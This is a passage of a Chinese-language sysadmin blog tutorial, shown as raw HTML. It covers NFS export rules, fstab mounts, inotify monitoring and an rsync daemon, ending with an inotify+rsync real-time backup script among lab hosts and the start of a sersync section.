class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/exports<br><br>/data/nfs-share1 *(rw,all_squash)<br><span class="hljs-comment">#ro只读</span><br><span class="hljs-comment">#rw读写</span><br><span class="hljs-comment">#root_squash:映射成nfsnobody</span><br><span class="hljs-comment">#all_squash:所有映射成nfsnobody</span><br><span class="hljs-comment">#anonuid:特定用户UID，需要先创建好用户，useradd -u 6666 web -s /sbin/nologin</span><br><span class="hljs-comment">#anongid:特定用户GID</span><br><br>[root@slave1 nfs-share1]<span class="hljs-comment">#exportfs -r</span><br>[root@slave1 nfs-share1]<span class="hljs-comment">#exportfs -v</span><br>/data/nfs-share1<br>&lt;world&gt;(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,rw,secure,root_squash,all_squash)<br><br>-rw-rw-r-- 1 nfsnobody nfsnobody   0 Oct  2 16:23 ikun1.txt<br>-rw-rw-r-- 1 ikun      ikun        5 Oct  2 14:37 ikun.txt<br>-rw-r--r-- 1 nfsnobody nfsnobody   0 Oct  2 16:23 root.txt<br><br>[root@slave1 nfs-share1]<span class="hljs-comment">#id nfsnobody</span><br>uid=65534(nfsnobody) gid=65534(nfsnobody) <span class="hljs-built_in">groups</span>=65534(nfsnobody)<br></code></pre></td></tr></table></figure><p>针对特定的主机给特定的权限，不要所有人都可以读写，指定给132权限</p><p>也可以给多个目录挂载规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">/data/nfs-share1 *(rw,all_squash) 10.0.0.132(ro)<br>/data/nfs-share2 *(ro)<br><br>[root@slave1 nfs-share1]<span class="hljs-comment">#exportfs -v</span><br>/data/nfs-share1<br>10.0.0.132(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,ro,secure,root_squash,no_all_squash)<br>/data/nfs-share1<br>&lt;world&gt;(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,rw,secure,root_squash,all_squash)<br><br>[root@rocky nfs]<span class="hljs-comment">#touch 111</span><br><span class="hljs-built_in">touch</span>: 无法创建 <span class="hljs-string">&#x27;111&#x27;</span>: 只读文件系统<br></code></pre></td></tr></table></figure><h2 id="5-实现nas设备永久挂载-客户端-etc-fstab"><a href="#5-实现nas设备永久挂载-客户端-etc-fstab" class="headerlink" title="5.实现nas设备永久挂载(客户端)/etc/fstab"></a>5.实现nas设备永久挂载(客户端)/etc/fstab</h2><p>记得是nfs，写fstab文件的时候</p><p>一般内网都是通的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/fstab<br>10.0.0.129:/data/nfs-share1 /data/nfs nfs defaults,_netdev 0 0<br>mount -a<br>reboot重启测试<br><br>[root@rocky ~]<span class="hljs-comment">#df -Th | grep nfs</span><br>10.0.0.129:/data/nfs-share1 nfs4       98G   17G   82G   17% /data/nfs<br></code></pre></td></tr></table></figure><h2 id="6-针对不同的项目写不同的exports规则-etc-exports-d-nginx-exports"><a href="#6-针对不同的项目写不同的exports规则-etc-exports-d-nginx-exports" class="headerlink" title="6.针对不同的项目写不同的exports规则/etc/exports.d/nginx.exports"></a>6.针对不同的项目写不同的exports规则/etc/exports.d/nginx.exports</h2><p>假设128是nginx机器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/exports.d/nginx.exports<br><br>/data/nfs-share2 10.0.0.128(rw)<br><br>exportfs -r <span class="hljs-comment">##配置文件生效</span><br>exportfs -v<br>/data/nfs-share1<br>10.0.0.132(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,ro,secure,root_squash,no_all_squash)<br>/data/nfs-share2<br>10.0.0.128(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,rw,secure,root_squash,no_all_squash)<br>/data/nfs-share1<br>&lt;world&gt;(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,rw,secure,root_squash,all_squash)<br><br><span class="hljs-comment">##nfs-server</span><br><span class="hljs-built_in">chmod</span> 777 /data/nfs-share2/<br><br>[root@master nginx]<span class="hljs-comment">#touch nginx.pic</span><br>[root@master nginx]<span class="hljs-comment">#ll</span><br>total 0<br>-rw-r--r-- 1 nfsnobody nfsnobody 0 Oct  2 17:06 nginx.pic<br></code></pre></td></tr></table></figure><h1 id="基于内核实现数据的实时同步inotify"><a href="#基于内核实现数据的实时同步inotify" class="headerlink" title="基于内核实现数据的实时同步inotify"></a>基于内核实现数据的实时同步inotify</h1><p>实现方式：inotify+rsync来实现</p><p>查看内核文件，在/boot下面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master boot]<span class="hljs-comment">#grep -i inotify config-3.10.0-1160.71.1.el7.x86_64</span><br>CONFIG_INOTIFY_USER=y<br><span class="hljs-comment">#功能已开启</span><br><br>inotify参数说明<br>[root@master boot]<span class="hljs-comment">#ll /proc/sys/fs/inotify/</span><br>total 0<br>-rw-r--r-- 1 root root 0 Oct  2 22:06 max_queued_events ---&gt;最大队列文件，代表能够监控最大变化事件。生产中调大<br>-rw-r--r-- 1 root root 0 Oct  2 22:06 max_user_instances ---&gt;每个用户创建inotify的最大值<br>-rw-r--r-- 1 root root 0 Oct  2 22:06 max_user_watches ---&gt;可以监控最大的文件个数，生产中调大<br><br>可以修改inotify的默认参数<br>grep -i max_queued_events /etc/sysctl.conf<br>grep -i max_user_watches<br><br>vim /etc/sysctl.conf <br>sysctl -p<br>net.nf_conntrack_max = 100000<br>net.ipv4.ip_forward = 1<br>fs.inotify.max_queued_events = 66666<br>fs.inotify.max_user_watches = 66666<br></code></pre></td></tr></table></figure><h2 id="安装inotify-tools工具，实现inotifywait"><a href="#安装inotify-tools工具，实现inotifywait" class="headerlink" title="安装inotify-tools工具，实现inotifywait"></a>安装inotify-tools工具，实现inotifywait</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install inotify-tools<br><br><span class="hljs-comment">##常用选项</span><br>inotifywait -m :保持事件监听<br>inotifywait -r :递归监控目录的数据变化<br>-q：输出少量的事件<br>-e：监听指定的事件<br><br>inotifywait -m /data/nfs-share1<br><br><span class="hljs-built_in">touch</span> nfs<br>[root@master boot]<span class="hljs-comment">#inotifywait -m /data/nfs</span><br>Setting up watches.<br>Watches established.<br>/data/nfs/ CREATE nfs<br>/data/nfs/ OPEN nfs<br>/data/nfs/ ATTRIB nfs<br>/data/nfs/ CLOSE_WRITE,CLOSE nfs<br><br>--format:输出的格式，可以自定义字样<br>--timefmt:时间格式<br>-e:监听指定事件，比如create，delete等<br><br><span class="hljs-comment">#持续后台监控，并记录日志</span><br>inotifywait -o /root/inotify.log -drq /data/www --timefmt <span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span> --format <span class="hljs-string">&quot;%T %w%f event: %e&quot;</span><br><br><span class="hljs-comment">#持续前台监控特定事件，自定义格式</span><br>inotifywait -mrq /data/www --timefmt <span class="hljs-string">&quot;%F %H:%M:%S&quot;</span> --format <span class="hljs-string">&quot;%T %w%f event:%;e&quot;</span> -ecreate,delete,moved_to,close_write,attrib<br></code></pre></td></tr></table></figure><h2 id="普通监控和自定义参数监控的区别：不需要额外去关注文件的操作"><a href="#普通监控和自定义参数监控的区别：不需要额外去关注文件的操作" class="headerlink" title="普通监控和自定义参数监控的区别：不需要额外去关注文件的操作"></a>普通监控和自定义参数监控的区别：不需要额外去关注文件的操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">编辑文件<br>vim d.txt<br>/data/nfs-share1/ CREATE d.txt<br>/data/nfs-share1/ ATTRIB d.txt<br>/data/nfs-share1/ CLOSE_WRITE,CLOSE d.txt<br><br>修改文件：涉及到东西太多，包括attrib，close_write等<br>删除文件：/data/nfs-share1/ DELETE a.txt<br><br>自定义参数：不用担心是否是哪个动作，直接显示时间+event，写入到变化日志中，可以查找，人为不需要去看他的文件具体是啥变化<br>不记录时间event<br>--format <span class="hljs-string">&quot;%T %w%f event:%;e&quot;</span><br>--format <span class="hljs-string">&#x27;%T %w %f&#x27;</span><br>inotifywait  -mrq  --exclude=<span class="hljs-string">&quot;.*\.swp&quot;</span> --timefmt <span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span> --format <span class="hljs-string">&#x27;%T %w %f&#x27;</span> -e create,delete,moved_to,close_write,attrib<br><br>2022-10-03 12:50:08 /data/nfs-share1/ e.txt<br>2022-10-03 12:50:08 /data/nfs-share1/ e.txt<br>2022-10-03 12:50:08 /data/nfs-share1/ e.txt<br></code></pre></td></tr></table></figure><h2 id="实现inotify-rsync脚本同步备份数据"><a href="#实现inotify-rsync脚本同步备份数据" class="headerlink" title="实现inotify+rsync脚本同步备份数据"></a>实现inotify+rsync脚本同步备份数据</h2><p>实现rync实现增量复制</p><p>rsync和rsync的协议</p><p>rsync：实现源目录到目标目录的增量复制，但是需要提前准备好检测目录文件变化的脚本检测方式</p><p>逻辑：一检测到nas服务器的/data/nfs-share1和2有变化，通过rsync同步过去</p><p>环境：</p><p>10.0.0.129 NAS服务器，共享目录</p><p>10.0.0.132 NAS备份服务器</p><h2 id="rsync常用参数"><a href="#rsync常用参数" class="headerlink" title="rsync常用参数"></a>rsync常用参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a:--archive 归档模式，表示以递归方式传输文件，并保持所有文件属性<br>-v:--verbose 详细模式输出<br>-z:-z, --compress 对备份的文件在传输时进行压缩处理<br>--delete:删除=删除，新建=新建，源+目的<br><br>一般<br>rsync -av 源目录/文件 目的目录/文件<br>rsync -av 源目录/文件 目的目录/文件<br><br>同步文件rsync -a 源 目的<br></code></pre></td></tr></table></figure><h2 id="1-在备份机器上安装rsync服务，监听873端口"><a href="#1-在备份机器上安装rsync服务，监听873端口" class="headerlink" title="1.在备份机器上安装rsync服务，监听873端口"></a>1.在备份机器上安装rsync服务，监听873端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install rsync-daemon<br>systemctl <span class="hljs-built_in">enable</span> --now rsyncd<br>ss -ntl | grep 873<br><br><span class="hljs-comment">#主配置文件，共享一个目录出来，重启文件生效</span><br>vim /etc/rsyncd.conf<br><br>[bak]<br><span class="hljs-comment">##记得要写path，注释不要和具体的配置写在一行上面</span><br>path=/data/bak/<br><span class="hljs-comment">##不只读，可写，可以往里面同步数据</span><br><span class="hljs-built_in">read</span> only=no <br>systemctl restart rsyncd<br><br><span class="hljs-comment">#访问远程目录，已经显示出来了</span><br>rsync rsync://10.0.0.132<br><br>[root@slave1 ~]<span class="hljs-comment">#rsync rsync://10.0.0.132</span><br>bak        <br><br><span class="hljs-comment">##修改备份目录的权限，使得others也可以写入，root用户写入被认为是例如nobody等</span><br><span class="hljs-built_in">chmod</span> 777 /data/bak<br>ll | grep bak<br>drwxrwxrwx.  2 root  root    33 10月  3 09:19 bak<br><br>ll /data/bak<br>总用量 4<br>-rw-r--r--. 1 root   root    0 10月  3 09:13 1.txt<br>-rw-r--r--. 1 nobody nobody 63 10月  3 09:19 shells<br></code></pre></td></tr></table></figure><h2 id="2-从数据机器进行备份"><a href="#2-从数据机器进行备份" class="headerlink" title="2.从数据机器进行备份"></a>2.从数据机器进行备份</h2><p>Cent OS7上面是nobody，Cent OS8上面是nfsnobody</p><p>这里走的是rsync协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#尝试将文件同步到这个backup目录下，两周写法均可</span><br>rsync /etc/fstab rsync://root@10.0.0.132/bak<br>rsync /etc/fstab 10.0.0.132::bak<br><br>[root@rocky bak]<span class="hljs-comment">#ls</span><br>1.txt  shells<br><br><span class="hljs-comment">#尝试从远端拉取1.txt文件，成功，复制到当前目录.</span><br>rsync rsync://root@10.0.0.132/bak/1.txt .<br><br>ll /data/bak<br>总用量 4<br>-rw-r--r--. 1 root   root    0 10月  3 09:13 1.txt<br>-rw-r--r--. 1 nobody nobody 63 10月  3 09:19 shells<br></code></pre></td></tr></table></figure><h2 id="3-实现经过认证授权才可以同步文件，需要用到固定账号"><a href="#3-实现经过认证授权才可以同步文件，需要用到固定账号" class="headerlink" title="3.实现经过认证授权才可以同步文件，需要用到固定账号"></a>3.实现经过认证授权才可以同步文件，需要用到固定账号</h2><h2 id="注释和文本不要写在一行！！！"><a href="#注释和文本不要写在一行！！！" class="headerlink" title="注释和文本不要写在一行！！！"></a>注释和文本不要写在一行！！！</h2><p>基于账号验证，需要写到固定文件里，也可以expect交互式，最好是不要写到脚本里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##在服务端编写配置文件</span><br>vim /etc/rsyncd.conf<br><br>uid = root<br>gid = root<br><span class="hljs-comment">#use chroot = yes</span><br>ignore errors<br>max connections = 0<br><span class="hljs-comment">##不限制连接数</span><br><span class="hljs-comment">#记录一下日志#</span><br><span class="hljs-built_in">log</span> file = /var/log/rsyncd.log<br>pid file = /var/run/rsyncd.pid<br>exclude = lost+found/<br><span class="hljs-comment">#transfer logging = yes</span><br><span class="hljs-comment">#timeout = 900</span><br><span class="hljs-comment">#ignore nonreadable = yes</span><br>dont compress   = *.gz *.tgz *.zip *.z *.Z *.rpm *.deb *.bz2 <span class="hljs-comment">##不要压缩</span><br><br>[bak]<br>path = /data/bak/<br><span class="hljs-comment">##记得要写path</span><br><span class="hljs-built_in">read</span> only = no<br><span class="hljs-comment">##不只读，可写</span><br>auth <span class="hljs-built_in">users</span> = rsyncuser <br><span class="hljs-comment">##默认用户</span><br>secrets file = /etc/rsync.pas <br><span class="hljs-comment">##默认密码</span><br><br><span class="hljs-comment">#服务端创建密码文件</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;rsyncuser:123&quot;</span> &gt; /etc/rsync.pas<br><span class="hljs-built_in">chmod</span> 600 /etc/rsync.pas <br><br><span class="hljs-comment">##加入开机启动</span><br>rsync --daemon<br>systemctl restart rsyncd<br><br><span class="hljs-comment">##客户端配置密码文件，只需要保留密码，修改权限</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;123&quot;</span> &gt; /etc/rsync.pas<br><span class="hljs-built_in">chmod</span> 600 /etc/rsync.pas<br></code></pre></td></tr></table></figure><p>查看、上传和下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##查看，调用自己客户端的密码文件，在服务端已经定义好了用户名和密码</span><br>[root@slave1 ~]<span class="hljs-comment">#rsync --password-file=/etc/rsync.pas rsync://rsyncuser@10.0.0.132/bak</span><br>drwxrwxrwx             46 2022/10/03 10:45:55 .<br>-rw-r--r--              0 2022/10/03 09:13:51 1.txt<br>-rw-r--r--            719 2022/10/03 10:45:55 fstab<br>-rw-r--r--             63 2022/10/03 09:19:59 shells<br><br><span class="hljs-comment">##上传</span><br>rsync -av /etc/group --password-file=/etc/rsync.pas rsync://rsyncuser@10.0.0.132/bak<br><br>sent 1,119 bytes  received 35 bytes  2,308.00 bytes/sec<br>total size is 1,028  speedup is 0.89<br><br><span class="hljs-comment">#查看</span><br>rsync --password-file=/etc/rsync.pas rsync://rsyncuser@10.0.0.132/bak<br>drwxrwxrwx             59 2022/10/03 11:27:30 .<br>-rw-r--r--              0 2022/10/03 09:13:51 1.txt<br>-rw-r--r--            719 2022/10/03 10:45:55 fstab<br>-rw-r--r--          1,028 2022/10/02 12:30:21 group<br>-rw-r--r--             63 2022/10/03 09:19:59 shells<br><br><span class="hljs-comment">#下载，到根目录</span><br>rsync -av --password-file=/etc/rsync.pas rsync://rsyncuser@10.0.0.132/bak/fstab .<br></code></pre></td></tr></table></figure><h1 id="nas-inotify-rsync-shell实现实时同步文件"><a href="#nas-inotify-rsync-shell实现实时同步文件" class="headerlink" title="nas+inotify+rsync+shell实现实时同步文件"></a>nas+inotify+rsync+shell实现实时同步文件</h1><p>环境：</p><p>10.0.0.132 备份服务器：搭建rsync同步服务端</p><p>10.0.0.129 数据服务器：inotify实现监控挂载到本地的NAS目录文件变化，通过rsync实时同步到服务端，搭建NAS服务给到master服务nginx使用，存放nginx web端的文件(通过映射nobody)</p><p><img src="2792175-20221028232748354-1112462271.png" alt="image-20221003115501789"></p><h2 id="1-基础环境"><a href="#1-基础环境" class="headerlink" title="1.基础环境"></a>1.基础环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.客户端<br>nginx端：10.0.0.128:/data/nfs<br><br><span class="hljs-comment">##挂载nas盘</span><br><span class="hljs-built_in">cat</span> /etc/fstab | grep nfs<br>10.0.0.129:/data/nfs-share1 /data/nfs nfs defaults,_netdev 0 0<br>mount -a<br>10.0.0.129:/data/nfs-share1 nfs4       98G   17G   82G  17% /data/nfs<br><br><span class="hljs-comment">##查看nas</span><br>[root@master nfs]<span class="hljs-comment">#ll</span><br>total 0<br>-rw-r--r-- 1 root root 0 Oct  3 12:04 test.txt<br><br>2.10.0.0.129 NAS服务端+inotify监控文件变化+rsync同步，基于/etc/rsync.pas密码文件来实现，inotifywait<br>监控/data/nfs-share1的数据变化，共享给到10.0.0.128使用<br><br>3.10.0.0.132 rsync同步远端目录 /data/bak，基于/etc/rsyncd.conf<br></code></pre></td></tr></table></figure><h2 id="2-编写脚本实现实时同步"><a href="#2-编写脚本实现实时同步" class="headerlink" title="2.编写脚本实现实时同步"></a>2.编写脚本实现实时同步</h2><p>逻辑：检查到源端有变化，则更新到目的端，10.0.0.132::bak</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim inotify_rsync.sh<br><br><span class="hljs-comment">##监控NAS目录的变化</span><br>SRC=<span class="hljs-string">&#x27;/data/nfs-share1/&#x27;</span><br><span class="hljs-comment">##备份服务器为132的bak，调用rsync的协议</span><br>DEST=<span class="hljs-string">&#x27;rsyncuser@10.0.0.132::bak&#x27;</span><br><br>rpm -q rsync &amp;&gt; /dev/null  || yum -y install rsync<br>rpm -q inotify-tools &amp;&gt; /dev/null  || yum -y install inotify-tools<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;starting monitor file change...&quot;</span><br><span class="hljs-built_in">sleep</span> 2<br><span class="hljs-comment">#持续前台监控特定事件,定义时间格式、日期格式、动作(新建、删除、移动---重命名、写入、权限变化) + nas目录，输入到while内</span><br>inotifywait  -mrq  --exclude=<span class="hljs-string">&quot;.*\.swp&quot;</span> --timefmt <span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span> --format <span class="hljs-string">&#x27;%T %w %f&#x27;</span> -e create,delete,moved_to,close_write,attrib <span class="hljs-variable">$&#123;SRC&#125;</span> |<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> DATE TIME DIR FILE;<span class="hljs-keyword">do</span><br>        FILEPATH=<span class="hljs-variable">$&#123;DIR&#125;</span><span class="hljs-variable">$&#123;FILE&#125;</span><br>        <span class="hljs-comment">##表示新建=新建，删除=删除</span><br>        rsync -az --delete  --password-file=/etc/rsync.pas <span class="hljs-variable">$SRC</span> <span class="hljs-variable">$DEST</span> <br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;At <span class="hljs-variable">$&#123;TIME&#125;</span> on <span class="hljs-variable">$&#123;DATE&#125;</span>, file <span class="hljs-variable">$FILEPATH</span> was backuped up via rsync&quot;</span> &gt;&gt; /var/log/changelist.log<br>        <span class="hljs-comment">#日志在129上面，在129上执行的脚本</span><br><span class="hljs-keyword">done</span><br><br>2022-10-03 12:50:08 /data/nfs-share1/ e.txt<br>刚好4个变量，传参给DATE TIME DIR FILE<br><br>FILEPATH=<span class="hljs-variable">$&#123;DIR&#125;</span><span class="hljs-variable">$&#123;FILE&#125;</span>---&gt;/data/nfs-share1/e.txt<br></code></pre></td></tr></table></figure><p>执行脚本，同时监控132的/data/bak</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#后台挂起监控，这个东西最好是实时跑的，或是不放心可以整个crontab -e让他实时跑</span><br><span class="hljs-built_in">nohup</span> ./inotify_rsync.sh<br>starting monitor file change...<br><br>crontab -e<br>* * * * * /root/inotify_rsync.sh<br><br>132上0.5监控一次，watch实时监控<br>watch -n0.5 <span class="hljs-built_in">ls</span> -l /data/bak<br><br><br><span class="hljs-comment">#在128nginx机器上实时写入文件</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;rsync test&quot;</span> &gt;&gt; rsync.txt<br><br>在129上查看实时日志，输出格式，查看变化的文件<br><span class="hljs-built_in">tail</span> -f /var/log/changelist.log<br>At 12:27:16 on 2022-10-03, file /data/nfs-share1/a.txt was backuped up via rsync<br>At 12:27:16 on 2022-10-03, file /data/nfs-share1/a.txt was backuped up via rsync<br><br>在132上查看实时rsyncd的日志<br><span class="hljs-built_in">tail</span> -f /var/log/rsyncd.log<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232751192-225702285.png" alt="image-20221003131013163"><img src="2792175-20221028232751457-1386164171.png" alt="image-20221003131143435"></p><h1 id="基于sersync进行自动化同步"><a href="#基于sersync进行自动化同步" class="headerlink" title="基于sersync进行自动化同步"></a>基于sersync进行自动化同步</h1><p>使用sersync同步：省去了inotify监控很多不必要监控的事件，也是调用内核的inotify指令，inotify会重复调用rsync命令，造成资源的浪费</p><p><img src="https://img2022.cnblogs.com/blog/2792175/202210/2792175-20221028232748918-255312001.png" alt="image-20221003145413888"></p><h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##获取软件包</span><br>sersync2.5.4_64bit_binary_stable_final.tar.gz<br><br>tar xf sersync2.5.4_64bit_binary_stable_final.tar.gz -C /apps/sersync<br><span class="hljs-built_in">ls</span> /apps/sersync<br><br>[root@slave1 GNU-Linux-x86]<span class="hljs-comment">#ls</span><br>confxml.xml  sersync2<br><br><span class="hljs-comment">##有关参数：</span><br>1.自动修改内核inotify的参数，grep fs.inotify.max_user_watches /etc/sysctl.conf<br>[root@slave1 GNU-Linux-x86]<span class="hljs-comment">#./sersync2 -h</span><br><span class="hljs-built_in">set</span> the system param<br>execute：<span 